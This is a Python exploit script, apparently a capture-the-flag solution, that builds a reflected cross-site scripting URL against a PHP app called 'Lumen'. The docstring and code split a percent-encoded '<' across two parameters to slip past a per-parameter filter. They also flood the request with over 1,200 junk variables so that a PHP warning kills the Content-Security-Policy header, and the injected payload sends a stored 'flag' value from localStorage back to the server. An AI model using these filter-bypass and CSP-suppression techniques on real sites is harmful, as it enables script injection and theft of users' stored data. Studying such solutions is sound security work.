#!/usr/bin/env python3
"""Lumen exploit builder.

Sink:  index.php ?p=view  ->  $path = urldecode(clean($dir) . clean($file))  echoed raw.
clean(): rejects the literal '%3c' (case-insensitive) per parameter, then htmlspecialchars(ENT_QUOTES).

So: percent-encode every byte of the payload (htmlspecialchars then leaves it alone,
the explicit urldecode restores it) and split the single '%3C' across the dir/file
boundary as '...%3' | 'C...', which no single parameter check ever sees.

CSP: not bypassed -- suppressed. >1000 GET vars makes PHP print
"Input variables exceeded 1000" during request startup; display_errors=1 +
output_buffering=0 flush it before index.php runs, so header('Content-Security-Policy')
dies with "headers already sent" and the response ships with no policy at all.
"""
import sys
from urllib.parse import quote

JUNK_VARS = 1200


def pct(s: str) -> str:
    """Percent-encode every byte so htmlspecialchars has nothing to escape."""
    return quote(s, safe="")


def build_query(payload_html: str, junk=JUNK_VARS) -> str:
    assert payload_html.count("<") == 1, "exactly one '<' (only one dir/file boundary)"
    v = pct(payload_html)                      # value after PHP's own urldecode
    i = v.upper().index("%3C")
    v_dir, v_file = v[: i + 2], v[i + 2 :]     # '...%3' | 'C...'
    for name, half in (("dir", v_dir), ("file", v_file)):
        assert "%3c" not in half.lower(), f"clean() would reject {name}"
    q = "/?p=view&dir=" + pct(v_dir) + "&file=" + pct(v_file)
    return q + "".join("&%d" % n for n in range(1, junk + 1))


def payload(trace_id: str) -> str:
    js = (
        "var S=String.fromCharCode(38);"
        "new Image().src='/?p=trace'+S+'id=" + trace_id + "'+S+'note='"
        "+encodeURIComponent(localStorage.getItem('flag'))"
    )
    return '<img src=x onerror="%s">' % js


if __name__ == "__main__":
    tid = sys.argv[1] if len(sys.argv) > 1 else "lumentrace01"
    base = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:5000"
    print(base + build_query(payload(tid)))
